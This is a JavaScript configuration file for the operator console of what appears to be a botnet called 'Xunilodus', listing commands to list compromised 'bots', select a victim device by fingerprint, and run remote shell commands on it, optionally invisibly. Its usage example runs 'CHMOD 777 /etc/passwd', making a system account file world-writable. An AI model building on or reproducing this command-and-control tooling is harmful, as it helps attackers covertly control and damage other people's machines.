module.exports = {
  command_list: [
    {
      "cmd_name": "HELP",
      "cmd_desc": "Help command provides info about all commands that can be used in Xunilodus.",
      "cmd_usage": "Type \"HELP\"."
    },
    {
      "cmd_name": "LISTBOTS",
      "cmd_desc": "This command show to Master's all bots available to be exploited be Xunilodus.",
      "cmd_usage": "Type \"LISTBOTS\"."
    },
    {
      "cmd_name": "IMPERSONATE",
      "cmd_desc": "This command perform an IMPERSONATION in the level of destination fingerprint. Using this command, the Master's can execute remote shellcodes.",
      "cmd_usage": "Type \"IMPERSONATE FA5B36CD\"."
    },
    {
      "cmd_name": "DEPERSONATE",
      "cmd_desc": "This command perform an DEPERSONIFICATION in the level of all destination fingerprints. Using this command, the Master's cannot execure remote shellcodes in previous impersonated device.",
      "cmd_usage": "Type \"DEPERSONATE\"."
    },
    {
      "cmd_name": "$",
      "cmd_desc": "This command allows master to execute remote shellcode in previous impersonated devices.",
      "cmd_usage": "Type \"$ \"CHMOD 777 /etc/passwd\"\"\nOptional Flags:\n--INVISIBLE\n--VISIBLE\n--MAXIMIZED\n--MINIMIZED."
    }
  ],
  command_messages: {
    "IMPERSONATE":{
      success: "The target has been impersonated with success. You can execute remote shellcode into device now.",
      failed: "Failed to impersonate the remote device. Check if the remote fingerprint is valid or if you already is impersonating another device."
    },
    "DEPERSONATE":{
      success: "The remote device has been depersonated with success.",
      failed: "Cannot depersonate the remote device."
    },
    "EXECUTE_SHELLCODE":{
      failed: "Cannot send the shellcode to the remote device. Check if you impersonated any device."
    }
  }
}